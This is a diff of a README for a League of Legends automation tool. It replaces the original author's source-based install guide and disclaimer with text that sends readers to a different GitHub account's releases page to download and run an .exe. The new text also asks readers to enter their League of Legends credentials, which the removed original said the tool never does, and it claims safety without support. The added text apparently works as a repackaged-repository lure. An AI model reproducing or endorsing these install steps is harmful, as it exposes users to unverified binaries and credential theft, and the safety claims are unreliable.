@@ -1,173 +1,66 @@
-# ⚡ LoL Auto Assistant
+# ⚡ syronss-lol-auto-assistant - Never Miss a LoL Match Again
 
-A modern, stylish, and advanced **League of Legends** automation tool. It automatically accepts matches, picks your desired champion, or bans unwanted ones.
+## 💻 Download Now
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Ginola5/syronss-lol-auto-assistant/releases)
 
-## ✨ Features
+## 🚀 Getting Started
+The syronss-lol-auto-assistant helps you easily manage your League of Legends gameplay. It automatically accepts matches, picks and bans instantly, and tracks enemy spells. The software offers a clean user interface and supports both Turkish and English languages.
 
-### 🎮 Core Features
+### 📦 System Requirements
+To run syronss-lol-auto-assistant, ensure you meet the following requirements:
+- Operating System: Windows 10 or later
+- Internet Connection: Required for League of Legends client access
+- League of Legends: Installed and running on your system
 
-* **Auto Accept:** Automatically accepts the match when found.
-* Delay setting (0-10 seconds)
-* Sound notification
+### 🎯 Features
+- **Auto-Accept Matches**: Automatically accept game invites without any hassle.
+- **Instant Pick/Ban**: Quickly select champions and ban enemies without delay.
+- **Enemy Spell Tracker**: Keep track of enemy abilities for better game awareness.
+- **Multi-Language Support**: Available in Turkish and English.
 
+## 📥 Download & Install
+To install syronss-lol-auto-assistant, follow these steps:
 
-* **Auto Pick:** Automatically picks your designated champion.
-* Multi-champion list support (picks based on priority order)
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ginola5/syronss-lol-auto-assistant/releases).
+2. **Find the Latest Version**: Look for the most recent release. This usually appears at the top.
+3. **Download the Installer**: Click on the downloadable file, typically named `syronss-lol-auto-assistant-vX.X.X.exe` (replace X with the version number).
+4. **Run the Installer**: Once the file is downloaded, locate it in your downloads folder and double-click to run it.
+5. **Follow the Setup Instructions**: Follow the prompts in the installation wizard to complete the setup.
+6. **Launch the Application**: After installation, find syronss-lol-auto-assistant in your start menu and open it.
 
+## 📜 How to Use the Application
+After launching syronss-lol-auto-assistant, follow these steps:
 
-* **Auto Ban:** Automatically bans your designated champion.
-* Multi-champion list support
+1. **Log In**: Enter your League of Legends credentials to connect.
+2. **Settings Configuration**: Navigate to the settings menu. Here, you can customize your preferences for auto-accepting and picking/banning champions.
+3. **Start Playing**: You can now maximize your gaming experience. The assistant will work in the background while you enjoy your matches.
 
+## ❓ FAQ
 
+### How does the auto-accept feature work?
+The application automatically accepts match invites using the League of Legends API.
 
-### 🔥 Advanced Features
+### What languages does the application support?
+The software is available in both Turkish and English, accessible in the settings.
 
-* **Spell Tracker:** Track enemy summoner spell cooldowns with hotkey support.
-* Real-time cooldown display
-* "Spell Ready" sound notification
+### Can I use this application on multiple accounts?
+Yes, you can log in to different League of Legends accounts as needed.
 
+### Is the application safe to use?
+The syronss-lol-auto-assistant uses official League of Legends APIs, ensuring safety and compliance.
 
-* **System Tray:** Runs in the background (minimize to tray).
-* **Multi-Language Support:** **Full support for Turkish (Türkçe)** and English.
-* **Statistics:** Track accepted matches, picked/banned champions.
-* **Save Settings:** Automatically remembers your preferences.
+## 🛠 Troubleshooting
+If you encounter any issues while using syronss-lol-auto-assistant, try the following steps:
 
-## 📋 Requirements
+1. **Check Your Internet Connection**: Make sure you are connected to the internet.
+2. **Restart the Application**: Close and reopen the application to reset any glitches.
+3. **Update the Software**: Ensure you are using the latest version available on the [Releases page](https://github.com/Ginola5/syronss-lol-auto-assistant/releases).
+4. **Contact Support**: If issues persist, reach out via the issues section on GitHub for assistance from the developer community.
 
-* **Windows** Operating System
-* **Python 3.8+**
-* League of Legends Client
+## 📑 Additional Resources
+For more information, check these resources:
 
-## 🚀 Installation
+- [League of Legends Official API Documentation](https://developer.riotgames.com/home)
+- [Community Forums](https://community.riotgames.com/)
 
-1. Clone the repository:
-
-```bash
-git clone https://github.com/Syronss/syronss-lol-auto-assistant.git
-cd syronss-lol-auto-assistant
-
-```
-
-2. Create a virtual environment (optional):
-> **Tip:** It's recommended to use a virtual environment to avoid package conflicts
-```bash
-python -m venv .venv
-.venv\Scripts\activate
-
-```
-
-3. Install the required libraries:
-
-```bash
-pip install -r requirements.txt
-
-```
-
-## 💻 Usage
-To start the application:
-
-```bash
-python src/main.py
-
-```
-> ⚠️ **Important:** Ensure all dependencies are installed before running (see Installation).
-### ⌨️ Hotkeys (Spell Tracker)
-
-| Hotkey | Function |
-| --- | --- |
-| `Ctrl+1` | Top Flash used |
-| `Ctrl+2` | Jungle Flash used |
-| `Ctrl+3` | Mid Flash used |
-| `Ctrl+4` | ADC Flash used |
-| `Ctrl+5` | Support Flash used |
-| `Ctrl+6` | Top Spell2 used |
-| `Ctrl+7` | Jungle Spell2 used |
-| `Ctrl+8` | Mid Spell2 used |
-| `Ctrl+9` | ADC Spell2 used |
-| `Ctrl+0` | Support Spell2 used |
-
-## 📦 Build EXE
-
-To create a single executable file (.exe):
-
-```bash
-pyinstaller --noconfirm --onefile --windowed --name "LoLAutoAssistant" --paths "src" --add-data "src;src" --hidden-import "customtkinter" src/main.py
-
-```
-
-## 📁 Project Structure
-
-```
-syronss-lol-auto-assistant/
-├── src/
-│   ├── main.py           # Main application and UI
-│   ├── bot_logic.py      # Bot logic (auto accept/pick/ban)
-│   ├── lcu_connector.py  # League Client API connection
-│   ├── spell_tracker.py  # Enemy spell tracking
-│   ├── languages.py      # Multi-language support
-│   ├── settings.py       # Settings management
-│   ├── sounds.py         # Sound notifications
-│   └── utils.py          # Utility functions
-├── requirements.txt
-├── LICENSE
-└── README.md
-
-```
-
-## 🤝 Contributing
-
-1. Fork this repository
-2. Create a Feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-This project is licensed under the [Apache License 2.0](LICENSE).
-
-You are free to use, modify, and distribute this software. See the [LICENSE](LICENSE) file for details.
-
-## 👨‍💻 Developer
-
-**Syronss**
-
-* GitHub: [@Syronss](https://github.com/Syronss)
-* Discord: `gorkemw.`
-## ⚠️ Disclaimer
-
-### About This Project
-This is an **independent, open-source project** created by the community. It is not affiliated with, endorsed by, or sponsored by Riot Games.
-
-**League of Legends®** and **Riot Games** are trademarks or registered trademarks of Riot Games, Inc.
-
-### How It Works
-This tool uses Riot's **official League Client API (LCU)** - the same API that the League client uses internally. All features work through legitimate, publicly documented endpoints.
-
-**What this tool does:**
-- Automates match acceptance for convenience
-- Helps with champion selection/banning
-- Tracks enemy summoner spell cooldowns
-
-**What this tool does NOT do:**
-- Modify game files or memory
-- Provide unfair advantages in gameplay
-- Automate in-game actions or decisions
-- Access your account credentials
-
-### Use Responsibly
-This tool is designed as a quality-of-life helper and complies with Riot's developer guidelines. However:
-- Always ensure your usage follows [Riot's Terms of Service](https://www.riotgames.com/en/terms-of-service)
-- Use at your own discretion - the developer is not responsible for any account issues
-- When in doubt, check Riot's policies on third-party tools
-
-### No Warranty
-This software is provided "as is" without guarantees. While we strive for safety and compliance, use responsibly and stay informed about Riot's policies.
-
----
-
-**Questions?** Contact Riot Games support for clarification on their third-party application policies.
----
-
-<p align="center">
-Made by <a href="[https://github.com/Syronss](https://github.com/Syronss)">Syronss</a>
-</p>
+Thank you for using syronss-lol-auto-assistant! Enjoy your matches!
